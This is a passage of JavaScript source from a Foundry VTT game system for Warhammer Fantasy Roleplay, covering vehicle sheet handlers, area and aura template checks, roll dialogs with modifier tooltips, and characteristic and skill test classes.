      sheetData.system.status.encumbrance.message = game.i18n.localize("VEHICLE.HandlingNoPenalty");
      if (sheetData.system.status.encumbrance.pct + sheetData.system.status.encumbrance.carryPct == 100 && sheetData.system.status.encumbrance.carryPct)
        sheetData.system.status.encumbrance.carryPct -= 1;
    }
    sheetData.system.status.encumbrance.total = sheetData.system.status.encumbrance.current + sheetData.system.status.encumbrance.over;
    sheetData.system.status.encumbrance.modMsg = game.i18n.format("VEHICLE.ModEncumbranceTT", { amt: sheetData.system.status.encumbrance.over }),
    sheetData.system.status.encumbrance.carryMsg = game.i18n.format("VEHICLE.CarryEncumbranceTT", { amt: Math.round(sheetData.system.status.encumbrance.current * 10) / 10 });
  }

  /* -------------------------------------------- */
  /*  Event Listeners and Handlers
  /* -------------------------------------------- */

  /**
   * Activate event listeners using the prepared sheet HTML
   * @param html {HTML}   The prepared HTML object ready to be rendered into the DOM
   */
  activateListeners(html) {
    super.activateListeners(html);

    html.find(".passenger .name").click(this._onPassengerClick.bind(this));
    html.find('.vehicle-weapon-name').click(this._onVehicleWeaponClick.bind(this));

    // Do not proceed if sheet is not editable
    if (!this.options.editable) return;

    html.find(".passenger-qty-click").mousedown(this._onPassengerQtyClick.bind(this));
    html.find(".passenger-delete-click").click(this._onPassengerDeleteClick.bind(this));
    html.find(".cargo .inventory-list .name").mousedown(this._onCargoClick.bind(this));
    html.find(".configure-move").click(this._onConfigureMove.bind(this));
    html.find(".configure-crew").click(this._onConfigureCrew.bind(this));
    html.find(".configure-morale").click(this._onConfigureMorale.bind(this));
    html.find(".configure-mood").click(this._onConfigureMood.bind(this));
    html.find(".roll-morale").click(this._onRollMorale.bind(this));
    html.find(".roll-mood").click(this._onRollMood.bind(this));
    html.find(".morale-delete").click(this._onDeleteMorale.bind(this));
    html.find(".mood-delete").click(this._onDeleteMood.bind(this));
    html.find(".crew-test").click(this._onRollCrewTest.bind(this));
    html.find(".crew-tests-collapse").click(this._onCrewTestsCollapse.bind(this));
    html.find('.ch-roll').click(this._onCharClick.bind(this));
    html.find('.role-click').click(this._onRoleClick.bind(this));
    html.find('.mood-events').click(this._onMoodEventsClick.bind(this));
    html.find('.sell-cargo').click(this._onSellCargo.bind(this));
  }


  _onPassengerClick(ev) {
    ev.stopPropagation();
    let id = this._getId(ev);
    this.actor.system.passengers.get(id)?.actor.sheet.render(true);
  }

  async _onRoleClick(ev) {
    let id = this._getId(ev);
    let actor = this.actor.system.passengers.get(id)?.actor;
    let role = this.actor.items.get(ev.currentTarget.dataset.roleId);
    if (role && actor)
    {
      role.system.roll(actor);
    }
  }

  _onMoodEventsClick(ev)
  {
    this.actor.system.status.mood.rollEvents(ev.currentTarget.dataset.key);  
  }

  _onSellCargo(ev)
  {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    if (item?.type == "cargo")
    {
      game.wfrp4e.trade.attemptSell(item);
    }
  }

  async _onVehicleWeaponClick(ev) {
    ev.preventDefault();
    let itemId = this._getId(ev);
    let weapon = this.actor.items.get(itemId);

    let vehicleSpeaker;
    if (this.actor.isToken)
    vehicleSpeaker = {
      token: this.actor.token.id,
      scene: this.actor.token.parent.id
    };
  else
    vehicleSpeaker = {
      actor: this.actor.id
    };


    let actor = await this.actor.system.passengers.choose();

    let test = await actor.setupWeapon(weapon, { vehicle: vehicleSpeaker, ammo: this.actor.getItemTypes("ammunition") });
    test.roll();
  }

  _onPassengerQtyClick(ev) {
    let multiplier = ev.button == 0 ? 1 : -1;
    multiplier = ev.ctrlKey ? multiplier * 10 : multiplier;
    let id = this._getId(ev);
    this.actor.update({ "system.passengers.list": this.actor.system.passengers.count(id,1 * multiplier ) });
  }

  _onPassengerDeleteClick(ev) {
    let id = this._getId(ev);
    this.actor.update({ "system.passengers.list": this.actor.system.passengers.remove(id) });
  }

  _onCargoClick(ev) {
    if (ev.button != 2) return;
    new Dialog({
      title: game.i18n.localize("SHEET.SplitTitle"),
      content: `<p>${game.i18n.localize("SHEET.SplitPrompt")}</p><div class="form-group"><input name="split-amt" type="text" /></div>`,
      buttons: {
        split: {
          label: game.i18n.localize("Split"),
          callback: (dlg) => {
            let amt = Number(dlg.find('[name="split-amt"]').val());
            if (isNaN(amt)) return
            this.splitItem(this._getId(ev), amt);
          }
        },
      },
      default: "split"
    }).render(true);
  }

  async _onExtendedTestSelect(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    let actor = await this.actor.system.passengers.choose();
    
    actor.setupExtendedTest(item);
  }

  _onConfigureMove(ev)
  {
    new VehicleMoveConfig(this.actor).render(true);
  }

  _onConfigureMorale(ev)
  {
    new VehicleCumulativeModifiersConfig(this.actor, {key : "morale"}).render(true);
  }

  _onConfigureMood(ev)
  {
    new VehicleCumulativeModifiersConfig(this.actor, {key : "mood"}).render(true);
  }

  _onConfigureCrew(ev)
  {
    new VehicleCrew(this.actor).render(true);
  }

  async _onRollMorale(ev) {
    new VehicleCumulativeModifiersConfig(this.actor, {key : "morale", roll: true}).render(true);
  }

  async _onRollMood(ev) {
    new VehicleCumulativeModifiersConfig(this.actor, {key : "mood", roll: true}).render(true);
  }
  
  async _onDeleteMorale(ev) {
    let index = this._getIndex(ev);
    let confirm = await Dialog.confirm({title : game.i18n.localize("Confirm"), content : "<p>" + game.i18n.localize('VEHICLE.Delete') + "</p>"});
    if (confirm)
    {
      this.actor.update({"system.status.morale.log" : this.actor.system.status.morale.deleteLog(index)});
    }
  }

  async _onDeleteMood(ev) {
    let index = this._getIndex(ev);
    let confirm = await Dialog.confirm({title : game.i18n.localize("Confirm"), content : "<p>" + game.i18n.localize('VEHICLE.Delete') + "</p>"});
    if (confirm)
    {
      this.actor.update({"system.status.mood.log" : this.actor.system.status.mood.deleteLog(index)});
    }
  }
  async _onRollCrewTest(ev)
  {
    let id = this._getId(ev);
    let test = this.actor.items.get(id);
    if (test)
    {
      test.system.roll();
    }
  }

  _onCrewTestsCollapse(ev)
  {
    let tests = $(ev.currentTarget.parentElement).siblings(".crew-tests");
    if (tests[0].style.display == "none")
      {
        tests.slideDown(200);
        ev.currentTarget.children[0].classList.remove("fa-chevron-down");
        ev.currentTarget.children[0].classList.add("fa-chevron-up");
    }
    else 
    {
      tests.slideUp(200);
      ev.currentTarget.children[0].classList.remove("fa-chevron-up");
      ev.currentTarget.children[0].classList.add("fa-chevron-down");
    }
  }
}

class AreaHelpers
{
    /**
     * Determines if a coordinate is within a Template's strokes
     *
     * @param {Object} {x, y} object being tested
     * @param {Template} template Template object being tested
     * @returns
     */
    static isInTemplate(point, template)
    {
        if (template.document.t == "rect")
        {
            return this._isInRect(point, template);
        }
        else if (["ray", "cone"].includes(template.document.t))
        {
            return this._isInPolygon(point, template);
        }
        else if (template.document.t == "circle")
        {
            return this._isInEllipse(point, template);
        }
    }


    /**
     * Get all Tokens inside template
     *
     * @returns
     */
    static tokensInTemplate(template)
    {
        let scene = template.scene;
        let tokens = scene.tokens.contents;
        return tokens.filter(t => this.isInTemplate(t.object.center, template));
    }

    static _isInEllipse(point, template)
    {
        let grid = canvas.scene.grid;
        let templateGridSize = template.document.distance/grid.distance * grid.size;
        // NEED TO USE template.document - hooks don't reflect template.x/y immediately
        let ellipse = new PIXI.Ellipse(template.document.x, template.document.y, templateGridSize, templateGridSize);
        return ellipse.contains(point.x, point.y);
    }


    // Not used currently
    static _isInRect(point, template)
    {
        // let x1 = template.document.x;
        // let x2 = x1 + template.document.shape.width;
        // let y1 = template.document.y;
        // let y2 = y1 + template.document.shape.height;

        // if (point.x > x1 && point.x < x2 && point.y > y1 && point.y < y2)
        // {
        //     return true;
        // }
    }

    // Not used currently
    static _isInPolygon(point, template)
    {                                                                                 // points are relative to origin of the template, needs to be origin of the map
        let polygon = new PIXI.Polygon(template.shape.points.map((coord, index) => coord += index % 2 == 0 ? template.document.x : template.document.y ));
        return polygon.contains(point.x, point.y);
    }


    // Perhaps this is expensive to run on every token update
    // but works for now
    static async checkAreas(scene)
    {
        scene = scene || canvas.scene;
        if (!scene)
        {
            return;
        }
        let tokens = scene.tokens;
        let templates = scene.templates.contents.map(t => t.object).concat(await this.aurasInScene(scene));

        for(let token of tokens)
        {
            for(let template of templates)
            {
                // An area could be a template, but could be an effect (aura)
                let areaUuid = (template.document.id ? template.document?.uuid : template.document.flags.wfrp4e.effectUuid);

                let existingEffect = token.actor?.currentAreaEffects.find(effect => effect.getFlag("wfrp4e", "fromArea") == areaUuid && !effect.applicationData.keep);
                let inTemplate = this.isInTemplate(token.object.center, template);
                if (inTemplate && !existingEffect)
                {
                    let effect = await template.document.areaEffect() || template.auraEffect;
                    if (effect && template.auraEffect?.actor != token.actor) // Specifically don't apply auras to self
                    {
                        // if template was placed from a test
                        let messageId = template.document?.getFlag("wfrp4e", "messageId");
                        let effectData = effect.convertToApplied(game.messages.get(messageId)?.getTest());
                        foundry.utils.setProperty(effectData, "flags.wfrp4e.fromArea",  areaUuid);
                        // Can't just send UUID because we need to include fromArea flags
                        token.actor?.applyEffect({effectData : [effectData], messageId});
                    }
                }
                else if (!inTemplate && existingEffect && !template.document.getFlag("wfrp4e", "instantaneous")) // If not in template, remove all effects originating from that template
                {
                    existingEffect.delete();
                }
            }

            // Remove effects that are from templates that don't exist anymore
            for(let effect of token.actor?.effects.filter(e => e.getFlag("wfrp4e", "fromArea") && !e.applicationData.keep) || [])
            {
                let fromId = effect.getFlag("wfrp4e", "fromArea");
                let foundTemplate = templates.find(t => {
                    let areaUuid = (t.document.id ? t.document?.uuid : t.document.flags.wfrp4e.effectUuid);
                    return fromId == areaUuid
                });
                
                if (!foundTemplate)
                {
                    effect.delete();
                }
            }
        }
    }


    // Create temporary MeasuredTemplates so that auras can
    // be processed the same way as normal Area effects
    static aurasInScene(scene)
    {
        let templates = [];
        for (let token of scene.tokens)
        {
            if (!token.actor)
                continue;

            let auraEffects = token.actor.auras;
            for (let effect of auraEffects)
            {
                templates.push(this.effectToTemplate(effect));
            }
        }

        return Promise.all(templates);
    }

    static effectToTemplate(effect)
    {
        let token = effect.actor.getActiveTokens()[0];
        let template = new MeasuredTemplate(new CONFIG.MeasuredTemplate.documentClass(foundry.utils.mergeObject({
            t: "circle",
            _id : effect.id,
            user: game.user.id,
            distance: effect.radius,
            direction: 0,
            x: token.center.x, // Using the token x/y will double the template's coordinates, as it's already a child of the token
            y: token.center.y, // However, this is necessary to get tho correct grid highlighting. The template's position is corrected when it's rendered (see renderAura)
            fillColor: game.user.color,
            flags: {
                wfrp4e: {
                    effectUuid: effect.uuid
                }
            }
            }, effect.flags.wfrp4e?.applicationData?.templateData || {}), {parent : canvas.scene}));

        // For some reason, these temporary templates have 0,0 as their coordinates
        // instead of the ones provided by the document, so set them manually
        template.x = template.document.x;
        template.y = template.document.y;
        template.auraEffect = effect;
        return template
    }
}

class CharacteristicTest extends TestWFRP {
  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return

    if (this.actor.type == "vehicle")
      this.data.preData.item = "t";
      
    this.computeTargetNumber();
  }

  computeTargetNumber() {
    this.data.result.target = this.item.value;
    super.computeTargetNumber();
  }

  get item() {
    return this.actor.characteristics[this.data.preData.item]
  }
  get characteristic() {
    return this.item
  }
}

/**
 * Easily handle and compute tooltips for dialog fields
 * 
 * Call #start to mark the initial values of the dialog
 * Call #finish to compare the initial with the current values
 */
class DialogTooltips 
{
    _modifier = [];
    _slBonus = [];
    _successBonus = [];
    _difficulty = [];

    _modifier1 = null;
    _slBonus1 = null;
    _successBonus1 = null;
    _difficulty1 = null;

    _modifier2 = null;
    _slBonus2 = null;
    _successBonus2 = null;
    _difficulty2 = null;

    constructor()
    {

    }

    get modifier() 
    {
        return this._formatTooltip("modifier");
    }
    get SL() 
    {
        return this._formatTooltip("SL");
    }
    get slBonus() 
    {
        return this._formatTooltip("slBonus");
    }
    get successBonus() 
    {
        return this._formatTooltip("successBonus");
    }
    get difficulty() 
    {
        return this._formatTooltip("difficulty");
    }

    clear() 
    {
        this.reset();
        this._modifier = [];
        this._slBonus = [];
        this._successBonus = [];
        this._difficulty = [];
    }

    reset()
    {
        this._modifier1 = null;
        this._slBonus1= null;
        this._successBonus1 = null;
        this._difficulty1 = null;

        this._modifier2 = null;
        this._slBonus2= null;
        this._successBonus2 = null;
        this._difficulty2 = null;
    }

    start(dialog)
    {
        this.reset();
        this._modifier1 = dialog.fields.modifier;
        this._slBonus1 = dialog.fields.slBonus;
        this._successBonus1 = dialog.fields.successBonus;
        this._difficulty1 = dialog.fields.difficulty;
    }

    finish(dialog, label)
    {
        this._modifier2 = dialog.fields.modifier;
        this._slBonus2 = dialog.fields.slBonus;
        this._successBonus2 = dialog.fields.successBonus;
        this._difficulty2 = dialog.fields.difficulty;

        this._computeDiff(label);
    }

    addModifier(value, label)
    {
        this._addTooltip("modifier", value, label);
    }

    addSLBonus(value, label)
    {
        this._addTooltip("slBonus", value, label);
    }

    addSuccessBonus(value, label)
    {
        this._addTooltip("successBonus", value, label);
    }

    _addTooltip(type, value, label)
    {
        if (value && label)
        {
            this[`_${type}`].push({value, label});
        }
    }

    _computeDiff(label)
    {

        let modifierDiff    = this._modifier2 - this._modifier1;
        let slBonusDiff     = this._slBonus2 - this._slBonus1;
        let successBonusDiff    = this._successBonus2 - this._successBonus1;
        let difficultyDiff  = this._difficulty2 != this._difficulty1;

        if (modifierDiff)
        {
            this._modifier.push({value : modifierDiff, label});
        }
        if (slBonusDiff)
        {
            this._slBonus.push({value : slBonusDiff, label});
        }
        if (successBonusDiff)
        {
            this._successBonus.push({value : successBonusDiff, label});
        }
        if (difficultyDiff)
        {
            this._difficulty.push({label});
        }
    }

    _formatTooltip(type, addLabel=false)
    {

        let typeLabel = ({
            "modifier" : "",
            "difficulty" : "",
            "slBonus" : game.i18n.localize("DIALOG.SLBonus"),
            "successBonus" : game.i18n.localize("DIALOG.SuccessBonus"),
        })[type];

        if (this[`_${type}`].length == 0)
        {
            return "";
        }
        else 
        {
            return `<p>${this[`_${type}`].map(i => 
            {
                if (i.value)
                {
                    // Add sign to positive numbers
                    return `&#8226; ${i.label} (${i.value > 0 ? "+" + i.value : i.value}${(addLabel && typeLabel) ? " " + typeLabel : ""})`;
                }
                else 
                { 
                    return `&#8226; ${i.label}`; 
                }

            }).join("</p><p>")}</p>`;
        }   
    }

    // Collection of all typed tooltips
    // used to display modifiers in the chat card
    getCollectedTooltips()
    {
        return this._formatTooltip("modifier", true) + this._formatTooltip("slBonus", true) + this._formatTooltip("successBonus", true) + this._formatTooltip("difficulty", true)
    }
}

class RollDialog extends Application {


    subTemplate = "";
    chatTemplate = ""
    selectedScripts = [];
    unselectedScripts = [];
    testClass = null;
    #onKeyPress;


    static get defaultOptions() {
        const options = super.defaultOptions;
        options.resizable = true;
        options.classes = options.classes.concat(["wfrp4e", "wfrp4e-dialog"]);
        return options;
    }
 
    get actor() 
    {
        return this.data.actor;
    }

    get template() 
    {
      return "systems/wfrp4e/templates/dialog/base-dialog.hbs";
    }

    constructor(fields, data, resolve, options)
    {
        super(options);
        this.data = data;
        this.tooltips = new DialogTooltips();

        this.initialFields = foundry.utils.mergeObject(this._defaultFields(), fields);
        this.fields = this._defaultFields();
        this.userEntry = {};

        // If an effect deems this dialog cannot be rolled, it can switch this property to true and the dialog will close
        this.abort = false;
        
        // The flags object is for scripts to use freely, but it's mostly intended for preventing duplicate effects
        // A specific object is needed as it must be cleared every render when scripts run again
        this.flags = {};
        
        Hooks.call("wfrp4e:createRollDialog", this);
        data.scripts = data.scripts.concat(this._createScripts(this.options.scripts));
        this.data.scripts = this._consolidateScripts(data.scripts);

        if (resolve)
        {
            this.resolve = resolve;
        }
    }

    /**
     * @abstract
     */
    static async setup(fields={}, data={}, options={})
    {
        throw new Error("Only subclasses of RollDialog can be setup")
    }

    async _render(...args)
    {
        await super._render(args);
        
        if (this.abort)
        {
            this.close();
        }
    }

    activateListeners(html) {
        super.activateListeners(html);

        this.form = html[0];
        this.form.onsubmit = this.submit.bind(this);

        // Listen on all elements with 'name' property
        html.find(Object.keys(new FormDataExtended(this.form).object).map(i => `[name='${i}']`).join(",")).change(this._onInputChanged.bind(this));

        html.find(".dialog-modifiers .modifier").click(this._onModifierClicked.bind(this));

        html.find("[name='advantage']").change(this._onAdvantageChanged.bind(this));
        
        // Don't add another listener if one already exists
        if (!this.#onKeyPress)
        {
            // Need to remember binded function to later remove
            this.#onKeyPress = this._onKeyPress.bind(this);
            document.addEventListener("keypress", this.#onKeyPress);
        }

    }

    submit(ev) 
    {
        ev.preventDefault();
        ev.stopPropagation();
        
        for(let script of this.data.scripts)
        {
            if (script.isActive)
            {
                script.submission(this);
            }
        }

        let test = new this.testClass(this._constructTestData(), this.actor);
        
        if (this.resolve)
        {
            this.resolve(test);
        }
        this.close();
        if (canvas.scene && !this.options.skipTargets)
        {
            game.user.updateTokenTargets([]);
            game.user.broadcastActivity({targets: []});
        }
        return test;
    }

    async bypass()
    {
        await this.getData();
        for(let script of this.data.scripts)
        {
            if (script.isActive)
            {
                script.submission(this);
            }
        }

        let test = new this.testClass(this._constructTestData(), this.actor);
        if (this.resolve)
        {
            this.resolve(test);
        }
    }

    _constructTestData()
    {
        if (!this.testClass)
        {
            throw new Error("Only subclasses of RollDialog can be submitted")
        }
        let data = foundry.utils.mergeObject(this.data, this.fields);
        data.options = this.options;
        data.breakdown = this.createBreakdown();
        if (!this.options.skipTargets)
        {
            data.targets = Array.from(data.targets).map(t => t.actor.speakerData(t.document));
        }
        data.chatOptions = this._setupChatOptions();
        data.chatOptions.rollMode = data.rollMode;
        return data
    }

    close() 
    {
        super.close();
        document.removeEventListener("keypress", this.#onKeyPress);
    }

    async getData() 
    {
        // Reset values so they don't accumulate 
        this.tooltips.clear();
        this.flags = {};
        this.fields = this._defaultFields();

        this.tooltips.start(this);
        foundry.utils.mergeObject(this.fields, this.initialFields);
        this.tooltips.finish(this, this.options.initialTooltip || "Initial");

        this.tooltips.start(this);
        for(let key in this.userEntry)
        {
            if (["string", "boolean"].includes(typeof this.userEntry[key]))
            {
                this.fields[key] = this.userEntry[key];
            }
            else if (Number.isNumeric(this.userEntry[key]))
            {
                this.fields[key] += this.userEntry[key];
            }
        }
        this.tooltips.finish(this, "User Entry");

        // For some reason cloning the scripts doesn't prevent isActive and isHidden from persisisting
        // So for now, just reset them manually
        this.data.scripts.forEach(script => 
        {
            script.isHidden = false;
            script.isActive = false;
        });
        
        this._hideScripts();
        this._activateScripts();
        await this.computeScripts();
        await this.computeFields();

        return {
            data : this.data,
            fields : this.fields,
            tooltips : this.tooltips,
            subTemplate : await this.getSubTemplate()
        };
    }


    _createScripts(scriptData = [])
    {
        return scriptData.map(i => new WFRP4eScript(foundry.utils.mergeObject(i, {
            options : {
                dialog : {
                    hideScript : i.hide, 
                    activateScript : i.activate, 
                    submissionScript : i.submit}}}),
            WFRP4eScript.createContext(this.item instanceof Item ? this.item : this.actor)))
    }

    /**
     * This is mostly for talents, where an actor likely has multiple
     * of the same talent. We don't want to show the same dialog effect
     * multiple times, so instead count the number of scripts that are the 
     * same. When executed, execute it the number of times there are scripts
     * 
     */
    _consolidateScripts(scripts)
    {
        let consolidated = [];

        for(let script of scripts)
        {
            let existing = consolidated.find(s => isSameScript(script, s));
            if (!existing)
            {
                script.scriptCount = 1;
                consolidated.push(script);
            }
            else 
            {
                existing.scriptCount++;
            }
        }

        function isSameScript(a, b)
        {
            return (a.Label == b.Label) &&
             (a.script == b.script) && 
             (a.options?.dialog?.hideScript == b.options?.dialog?.hideScript) && 
             (a.options?.dialog?.activateScript == b.options?.dialog?.activateScript) &&
             (a.options?.dialog?.submissionScript == b.options?.dialog?.submissionScript)
        }
        return consolidated
    }

    _hideScripts()
    {
        this.data.scripts.forEach((script, index) => 
        {
            // If user selected script, make sure it is not hidden, otherwise, run its script to determine
            if (this.selectedScripts.includes(index))
            {
                script.isHidden = false;
            }
            else
            {
                script.isHidden = script.hidden(this);
            }
        });
    }

    _activateScripts()
    {
        this.data.scripts.forEach((script, index) => 
        {
            // If user selected script, activate it, otherwise, run its script to determine
            if (this.selectedScripts.includes(index))
            {
                script.isActive = true;
            }
            else if (this.unselectedScripts.includes(index))
            {
                script.isActive = false;
            }
            else if (!script.isHidden) // Don't run hidden script's activation test
            {
                script.isActive = script.activated(this);
            }
        });
    }

    async computeScripts() 
    {
        for(let script of this.data.scripts)
        {
            if (script.isActive)
            {
                this.tooltips.start(this);
                for(let i = 0; i < script.scriptCount; i++)
                {
                    await script.execute(this);
                }
                this.tooltips.finish(this, script.Label);
            }
        }
    }



    async computeFields() 
    {
        this._computeAdvantage();
        if (this.actor.attacker)
        {
            this._computeDefending(this.actor.attacker);
        }

        if (this.data.targets.length && !this.actor.attacker)
        {
            this._computeTargets(this.data.targets[0]);
        }
    }

    _computeAdvantage()
    {
        if (game.settings.get("wfrp4e", "autoFillAdvantage"))
        {
            this.tooltips.start(this);
            if (!game.settings.get("wfrp4e", "mooAdvantage"))
            {
                this.fields.modifier += (game.settings.get("wfrp4e", "advantageBonus") * this.actor.system.status.advantage.value);
            }
            else 
            {
                this.fields.successBonus += this.actor.system.status.advantage.value;
            }
            this.tooltips.finish(this, "Advantage");
        }
    }

    /**
     * Runs when the actor is being attacked
     * @abstract
     */
    _computeDefending(attacker)
    {

    }

    /** 
     * Runs if targeting an actor
     * @abstract
     */
    _computeTargets(target)
    {

    }

    
    /**
     * Allows subclasses to insert custom fields
     */
     async getSubTemplate()
     {
         if (this.subTemplate)
         {
             return await renderTemplate(this.subTemplate, {fields : this.fields, data: this.data, options : this.options});
         }
     }


    _onInputChanged(ev) 
    {
        let value = ev.currentTarget.value;
        if (ev.currentTarget.name == "advantage")
        {
            return;
        }
        if (Number.isNumeric(value))
        {
            value = Number(value);
        }

        if (ev.currentTarget.type == "checkbox")
        {
            value = ev.currentTarget.checked;
        }

        this.userEntry[ev.currentTarget.name] = value;

        this.render(true);
    }

    _onModifierClicked(ev)
    {
        let index = Number(ev.currentTarget.dataset.index);
        if (!ev.currentTarget.classList.contains("active"))
        {
            // If modifier was unselected by the user (originally activated via its script)
            // it can be assumed that the script will still be activated by its script
            if (this.unselectedScripts.includes(index))
            {
                this.unselectedScripts = this.unselectedScripts.filter(i => i != index);
            }
            else 
            {
                this.selectedScripts.push(index);
            }
        }
        else 
        {
            // If this modifier was NOT selected by the user, it was activated via its script
            // must be added to unselectedScripts instead
            if (!this.selectedScripts.includes(index))
            {
                this.unselectedScripts.push(index);
            }
            else // If unselecting manually selected modifier
            {
                this.selectedScripts = this.selectedScripts.filter(i => i != index);
            }
        }
        this.render(true);
    }

    _onAdvantageChanged(ev)
    {
        this.actor.update({"system.status.advantage.value" : Number(ev.currentTarget.value)}).then(a => this.render(true));
        ui.notifications.notify(game.i18n.localize("DIALOG.AdvantageUpdate"));
    }

    /**
     * 
     * @param {object} data Dialog data, such as title and actor
     * @param {object} data.title.replace Custom dialog/test title
     * @param {object} data.title.append Append something to the test title
     * @param {object} fields Predefine dialog fields
     */
    static awaitSubmit({data={}, fields={}}={})
    {
        return new Promise(resolve => 
        {
            new this(data, fields, resolve).render(true);
        });
    }

    _onKeyPress(ev)
    {
        if (ev.key == "Enter")
        {
            this.submit(ev); 
        }
    }
    
    updateTargets()
    {
        this.data.targets = Array.from(game.user.targets);
        this.render(true);
    }


    _defaultDifficulty()
    {
        let difficulty = "challenging";

        // Overrides default difficulty to Average depending on module setting and combat state
        if (game.settings.get("wfrp4e", "testDefaultDifficulty") && (game.combat != null))
            difficulty = game.combat.started ? "challenging" : "average";
        else if (game.settings.get("wfrp4e", "testDefaultDifficulty"))
            difficulty = "average";

        return difficulty;
    }
    _defaultFields() 
    {
        return {
            modifier : 0,
            successBonus : 0,
            slBonus : 0,
            difficulty : this._defaultDifficulty(),
            rollMode : game.settings.get("core", "rollMode") || "publicroll"
        };
    }

    createBreakdown()
    {
        let breakdown = {
            modifier: this.fields.modifier,
            difficulty : this.fields.difficulty,
            slBonus : this.fields.slBonus,
            successBonus : this.fields.successBonus,
            modifiersBreakdown : this.tooltips.getCollectedTooltips()
        };
        return breakdown;
    }

    
    static updateActiveDialogTargets() 
    {
        Object.values(ui.windows).forEach(i => 
        {
            if (i instanceof TestDialog)
            {
                i.updateTargets();
            }
        });
    }

 /**
   * Ghat card options.
   *
   * All tests use the same chatOptions, but use the template member defined in each dialog class
   */
    _setupChatOptions() {
        let chatOptions = {
            speaker: {
                alias: this.actor.token?.name || this.actor.prototypeToken.name,
                actor: this.actor.id,
            },
            title: this.options.title,
            template: this.chatTemplate,
            flags: { img: this.actor.prototypeToken.randomImg ? this.img : this.actor.prototypeToken.texture.src }
            // img to be displayed next to the name on the test card - if it's a wildcard img, use the actor image
        };

        // If the test is coming from a token sheet
        if (this.actor.token) {
        chatOptions.speaker.alias = this.actor.token.name; // Use the token name instead of the actor name
        chatOptions.speaker.token = this.actor.token.id;
        chatOptions.speaker.scene = canvas.scene.id;
        chatOptions.flags.img = this.actor.token.texture.src; // Use the token image instead of the actor image

        if (this.actor.token.hidden) {
            chatOptions.speaker.alias = "???";
            chatOptions.flags.img = "systems/wfrp4e/tokens/unknown.png";
        }
        }
        else // If a linked actor - use the currently selected token's data if the actor id matches
        {
        let speaker = ChatMessage.getSpeaker();
        if (speaker.actor == this.actor.id) 
        {
            let token = speaker.token ? canvas.tokens.get(speaker.token) : null;
            chatOptions.speaker.alias = speaker.alias;
            chatOptions.speaker.token = speaker.token;
            chatOptions.speaker.scene = speaker.scene;
            chatOptions.flags.img = token ? token.document.texture.src : chatOptions.flags.img;
            if (token?.document.hidden) {
            chatOptions.speaker.alias = "???";
            chatOptions.flags.img = "systems/wfrp4e/tokens/unknown.png";
            }
        }
        }

        if (this.isMounted && this.mount) {
            chatOptions.flags.mountedImg = this.mount.prototypeToken.texture.src;
            chatOptions.flags.mountedName = this.mount.prototypeToken.name;
        }

        if (VideoHelper.hasVideoExtension(chatOptions.flags.img))
        game.video.createThumbnail(chatOptions.flags.img, { width: 50, height: 50 }).then(img => chatOptions.flags.img = img);

        //Suppresses roll sound if the test has it's own sound associated
        foundry.utils.mergeObject(chatOptions,
        {
            user: game.user.id,
            sound: CONFIG.sounds.dice
        }, {overwrite : false});

        return chatOptions
    }


    // Backwards compatibility for effects
    get prefillModifiers() 
    {
        return this.fields;
    }

    get type() 
    {

    }
}

class CharacteristicDialog extends RollDialog {

    testClass = CharacteristicTest
    chatTemplate = "systems/wfrp4e/templates/chat/roll/characteristic-card.hbs"

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["characteristic-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.characteristic
    }

    get characteristic() 
    {
      return this.data.characteristic;
    }


    static async setup(fields={}, data={}, options={})
    {
        options.title = options.title || game.i18n.format("CharTest", {char: game.wfrp4e.config.characteristics[data.characteristic]});
        options.title += options.appendTitle || "";

        if (options.reload)
        {
            data.scripts = data.scripts.concat(options.weapon?.ammo.getScripts("dialog"));
        }

        data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);

        return new Promise(resolve => {
            let dlg = new this(fields, data, resolve, options);
            if (options.bypass)
            {
                dlg.bypass();
            }
            else 
            {
                dlg.render(true);
            }
        })
    }

    
    _constructTestData()
    {
        let data = super._constructTestData();
        data.item = this.data.characteristic;
        return data;
    }

    
    computeFields() {
        super.computeFields();

        if (this.options.dodge && this.actor.isMounted) {
            this.fields.modifier -= 20;
            this.tooltips.addModifier(-20, game.i18n.localize("EFFECT.DodgeMount"));
        }
    }


    _computeDefending(attacker)
    {
        if (attacker.test.item.properties?.flaws.slow) {
            if (!game.settings.get("wfrp4e", "mooQualities") || this.options.dodge) 
            {
                this.fields.slBonus += 1;
                this.tooltips.addSLBonus(1, game.i18n.localize('CHAT.TestModifiers.SlowDefend'));
            }
        }

    }
    
    _defaultDifficulty() 
    {
        let difficulty = super._defaultDifficulty();
        if (this.options.corruption || this.options.mutate)
        {
            difficulty = "challenging";
        }

        if (this.options.rest || this.options.income)
        {
            difficulty =  "average";
        }
        return difficulty;
    }

    createBreakdown()
    {
        let breakdown = super.createBreakdown();
        if (this.characteristic)
        {
            breakdown.characteristic = `${this.actor.system.characteristics[this.characteristic].value} (${game.wfrp4e.config.characteristics[this.characteristic]})`;
        }
        return breakdown;
    }

    // Backwards compatibility for effects
    get type() 
    {
        return "characteristic";
    }
}

class SkillTest extends TestWFRP {

  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return
    this.data.preData.options.characteristicToUse = data.characteristicToUse;
    this.data.preData.skillName = data.skillName;
    this.computeTargetNumber();
  }

  computeTargetNumber() {

    // If unknown skill, defer until later, once skill is found
    if (this.preData.item == "unknown" && !this.context.unknownSkill)
      return 0

    try {
      // If skill is not owned by the actor, just use characteristic
      if (this.context.unknownSkill) {
        this.result.target = this.actor.characteristics[this.context.unknownSkill.system.characteristic.value].value;
      }
      else {


        // Use skill total if characteristics match, otherwise add the total up manually
        if (this.preData.options.characteristicToUse && this.preData.options.characteristicToUse != this.item.characteristic.key)
          this.result.target = this.actor.characteristics[this.preData.options.characteristicToUse].value + this.item.advances.value;
        else
          this.result.target = this.item.total.value;
      }
    }
    catch
    {
      this.result.target = this.item.total.value;
    }

    super.computeTargetNumber();
  }

  async roll() {

    // If skill id is unknown, meaning the actor doesn't have the skill, find the skill and use characteristic
    if (this.preData.item == "unknown") {
      let skill = await WFRP_Utility.findSkill(this.preData.skillName);
      if (skill) {
        this.context.unknownSkill = skill.toObject();
        this.computeTargetNumber();
      }
      else {
        throw new Error(game.i18n.localize("ERROR.Found", { name: this.skill }))
      }
    }


    await super.roll();
  }

  get skill() {
    return this.item
  }

  get item() {
